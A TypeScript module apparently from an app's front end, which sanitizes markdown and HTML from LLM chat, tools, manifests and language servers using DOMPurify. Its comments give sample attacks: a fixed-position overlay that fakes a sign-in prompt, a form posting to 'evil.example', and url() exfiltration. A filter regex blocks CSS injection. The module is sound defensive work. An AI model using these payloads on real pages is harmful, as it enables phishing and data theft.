/**
 * The one place core turns markup someone else wrote into an HTML string it will
 * render.
 *
 * Every `{@html}`/`innerHTML` sink that receives text it did not build itself goes
 * through here: chat and tool-call markdown (an LLM's own words and the output of
 * tools that read an untrusted repository), an agent manifest's description, and
 * language-server hover documentation. `html-sinks.py` lists those files, and rule 4
 * requires each of them to import this module — a sink that stops sanitizing is a
 * gate failure, not a quiet regression.
 *
 * DOMPurify's defaults already remove what executes: event handlers, `javascript:`
 * and `data:` URIs, `<script>/<iframe>/<object>/<base>/<link>`, and the mXSS
 * containers (`<template>`, `<xmp>`, `<noembed>`, `<foreignObject>`). Verified
 * against the pinned version rather than assumed — see
 * `__tests__/sanitize.unit.ts`, which is written as the payload list, not as a
 * description of this config.
 *
 * What its defaults keep, and this does not, is `style`. That is the difference
 * between "no script runs" and "nothing the model says can rearrange the page":
 * `<p style="position:fixed;inset:0;background:#111">click here to continue</p>`
 * survives DOMPurify's default config byte for byte, and no ancestor of a chat
 * bubble establishes a containing block (`app.css` declares no `position: fixed`,
 * and the chat subtree has no `transform`/`filter`/`contain`), so a fragment with
 * that declaration paints over the application in its own theme — a fake sign-in
 * prompt, or an invisible box over a real button. `url()` in the same attribute is
 * an exfiltration attempt that CSP `img-src 'self' data: blob:` happens to stop;
 * depending on CSP for a markup problem is not a plan.
 *
 * Dropping `style` — the attribute and the element — costs almost nothing: `marked`
 * never emits either, so ordinary markdown is untouched, and the only content that
 * carries them is HTML someone hand-wrote inside a markdown document.
 *
 * The second refusal is the `<style>` element, and it is the one that was measured rather
 * than assumed: DOMPurify's defaults drop a **bare** `<style>` and keep one nested in any
 * container (`<div><style>…</style></div>` survives it), and `marked` wraps most block
 * HTML in a container on the way through. Measured on the pinned version, in
 * `__tests__/sanitize.unit.ts`: a chat bubble authored by a model can otherwise install a
 * stylesheet that hides the board, restyles a button into looking pressed, or leaks a URL
 * through `url()`. Dropping the `style` attribute while keeping the element would be the
 * same refusal written twice and missing half the shapes it is for.
 *
 * The third refusal is the `<form>` element, for the same class of reason: DOMPurify's
 * defaults keep `<form action="https://evil.example"><input name=t><button>Go</button>`
 * whole, `marked` passes an inline one through from a paragraph, and it then renders a
 * live input and button inside a chat bubble — in the application's own chrome, with the
 * application's own credibility. CSP `form-action 'self'` and the CSRF header are the two
 * layers that actually stop it sending anything; asking markup that came from a model or
 * a repository to leave a submit control in the page is the thing to refuse, not to
 * mitigate twice removed. `<input>` itself stays: `marked` emits a disabled checkbox for
 * every `- [ ]` task-list item, and a control with no form to submit is inert.
 *
 * `class` is deliberately kept. The LSP plugin colors fenced code by emitting
 * `<span class="tok-…">`, and class adoption is not the same risk — a class only
 * selects a rule the application already ships, `app.css` has no `position: fixed`
 * rule for untrusted markup to adopt, and component styles are scope-hashed.
 */
import { Marked } from 'marked';
import DOMPurify from 'dompurify';

/** Attributes no untrusted fragment may carry, whatever their value. A mutable
 * array only because that is what DOMPurify's config type accepts; nothing here
 * hands it out. */
const FORBID_ATTR: string[] = ['style'];

/** Elements no untrusted fragment may carry, whatever they contain. Mutable for the
 * same reason as `FORBID_ATTR`. `style` is here because of the attribute refusal above:
 * a stylesheet is the same layout power with a different syntax, and DOMPurify's defaults
 * keep a nested one. DOMPurify's own `FORBID_CONTENTS` covers `style`, so forbidding the
 * element drops the rules with it rather than leaving them as visible text. */
const FORBID_TAGS: string[] = ['form', 'style'];

/**
 * Sanitize an HTML fragment authored outside this app.
 *
 * `forbidTags` adds to the refusals above for one call site's reason — hover cards drop
 * `<hr>` because a language server emits section rules the card's own layout already
 * provides. It cannot re-allow anything.
 */
export function sanitizeHTML(html: string, forbidTags?: readonly string[]): string {
    const tags = forbidTags?.length ? [...FORBID_TAGS, ...forbidTags] : FORBID_TAGS;
    return DOMPurify.sanitize(html, { FORBID_ATTR, FORBID_TAGS: tags });
}

/**
 * The only fence tag rendered rather than shown; `DIAGRAM_FENCE_TAG` below is drawn, but as an image
 * rather than as markup in this document.
 */
const RENDERED_FENCE_TAG = 'markdown';

/** The first word of a fence's info string, which is the whole string; `marked` keeps its case. */
export function fenceTag(lang: string | undefined): string {
    return lang?.trim().split(/\s+/)[0] ?? '';
}

/** Whether a fence names the rendered document rather than a language to show. */
export function isRenderedFence(lang: string | undefined): boolean {
    return fenceTag(lang).toLowerCase() === RENDERED_FENCE_TAG;
}

/** The one fence tag drawn as a diagram instead of shown as text. */
const DIAGRAM_FENCE_TAG = 'mermaid';

/**
 * Whether a fence holds a diagram source. Beside `isRenderedFence`, not underneath it: a rendered fence
 * becomes markup in this document, a diagram becomes an image owned by a component.
 */
export function isDiagramFence(lang: string | undefined): boolean {
    return fenceTag(lang).toLowerCase() === DIAGRAM_FENCE_TAG;
}

/** Markdown parsed the default way, for inside a rendered fence. With no renderer of its own, a
 * `RENDERED_FENCE_TAG` fence in there is source again, so one block costs one parse. */
const plainMarkdown = new Marked({ async: false });

/** The parse a sink hands its text to: `false` from a renderer method is marked's "the built-in one".
 * The nested HTML goes into this output, so the one `sanitizeHTML` call covers a fenced document. */
const embeddingMarkdown = new Marked({ async: false }).use({
    renderer: {
        code({ lang, text }) {
            if (!isRenderedFence(lang)) return false;
            return plainMarkdown.parse(text, { async: false });
        },
    },
});

/**
 * Markdown authored outside this app, rendered and sanitized in one step — the shape
 * every chat-side sink needs. `async: false` is not a style choice: without it
 * `marked` returns a promise and the sink would stringify a `[object Promise]`.
 *
 * No *extra* tag refusal here, to be clear: `FORBID_TAGS` above applies to markdown
 * exactly as it does to a fragment. What markdown needs no extra of is the per-call kind
 * (hover docs, the one in flight, render through the plugin and call `sanitizeHTML`
 * directly).
 */
export function markdownToSafeHTML(markdown: string): string {
    return sanitizeHTML(embeddingMarkdown.parse(markdown, { async: false }));
}

/** An SVG parsed as a standalone document must declare this. */
const SVG_NAMESPACE = 'http://www.w3.org/2000/svg';

/** Attributes the browser may follow somewhere else: another document, another host. */
const REFERRING_ATTRS = ['href', 'xlink:href', 'src'];

/**
 * A generated SVG *document* headed for an `<img>`, or `''` if it is not one — the only markup this app
 * keeps `style` on, because these bytes reach an image of their own and never this document. Refuses the
 * root's own `style` and any `href`/`src` that is not an internal fragment.
 * `docs/markup-sanitizing.md → A diagram fence is drawn as an image` owns the why.
 */
export function svgImageMarkup(markup: string): string {
    if (!markup) return '';
    // DOMPurify's own defaults, not FORBID_TAGS/FORBID_ATTR above: styles are the point here.
    const body = DOMPurify.sanitize(markup, { RETURN_DOM: true, FORBID_TAGS: ['form'] }) as unknown as HTMLElement;
    const kids = Array.from(body.children);
    if (kids.length !== 1 || kids[0].tagName.toLowerCase() !== 'svg') return '';
    const beside = Array.from(body.childNodes).filter((n) => n.nodeType === Node.TEXT_NODE);
    if (beside.some((n) => (n.textContent ?? '').trim() !== '')) return '';

    const root = kids[0];
    root.removeAttribute('style');
    for (const el of [root, ...Array.from(root.querySelectorAll('*'))]) {
        for (const name of REFERRING_ATTRS) {
            const value = el.getAttribute(name);
            // A `#fragment` is how a diagram references its own marker or gradient.
            if (value !== null && !value.startsWith('#')) el.removeAttribute(name);
        }
    }
    root.setAttribute('xmlns', SVG_NAMESPACE);
    return new XMLSerializer().serializeToString(root);
}

/**
 * A value headed for an inline `style` attribute, or `fallback` if it could start a declaration
 * of its own: inside that attribute a `;` begins another rule, and `url()` is a fetch.
 */
export function safeCSSValue(value: string, fallback: string): string {
    return /[{};<>"'\\]|url\s*\(|expression\s*\(|@import/i.test(value) ? fallback : value;
}

/**
 * An icon file's contents, accepted only as a lone `<svg>` root — otherwise nothing.
 *
 * `Icon.svelte` renders `src` with `{@html}`, and every call site today passes an
 * `*.svg?raw` import, so the value is a build-time file. That is a fact about the 13
 * files and 26 `<Icon>` sites around it, which the component cannot see: the next
 * `src={manifest.icon}` would turn a build-time asset into untrusted text and nothing
 * would notice. Requiring the declared shape is the check that travels with the
 * component.
 *
 * Sanitized first, so this is not a hand-written HTML validator pretending to be
 * one — the parse that decides is DOMPurify's, and what survives is re-read from
 * the DOM it built rather than matched against a pattern. `RETURN_DOM` is what
 * keeps this module free of an `innerHTML` of its own.
 */
export function singleSvgMarkup(markup: string): string {
    if (!markup) return '';
    const body = DOMPurify.sanitize(markup, { FORBID_ATTR, FORBID_TAGS, RETURN_DOM: true }) as unknown as HTMLElement;
    const kids = Array.from(body.children);
    if (kids.length !== 1 || kids[0].tagName.toLowerCase() !== 'svg') return '';
    // Text beside the root is a second payload riding along with the icon. Text
    // *inside* it is the icon's own content (`<text>` is how an SVG draws a glyph) and
    // is inert, so only the root's siblings are refused.
    const beside = Array.from(body.childNodes).filter(n => n.nodeType === Node.TEXT_NODE);
    if (beside.some(n => (n.textContent ?? '').trim() !== '')) return '';
    return kids[0].outerHTML;
}
